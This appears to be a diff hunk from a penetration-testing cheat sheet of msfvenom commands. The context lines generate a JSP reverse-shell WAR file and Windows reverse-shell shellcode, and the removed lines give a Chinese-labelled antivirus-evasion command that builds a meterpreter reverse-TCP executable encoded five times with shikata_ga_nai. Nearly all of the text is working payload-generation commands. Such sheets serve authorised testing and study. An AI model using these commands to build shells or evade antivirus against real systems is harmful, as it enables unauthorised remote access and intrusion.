@@ -93,7 +93,3 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=1234 -f war > shell.war
 # shellcode
 msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
 ```
-免杀版命令
-```shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.161 LPORT=1234 -e x64/shikata_ga_nai -i 5 -f exe > shell.exe
-```
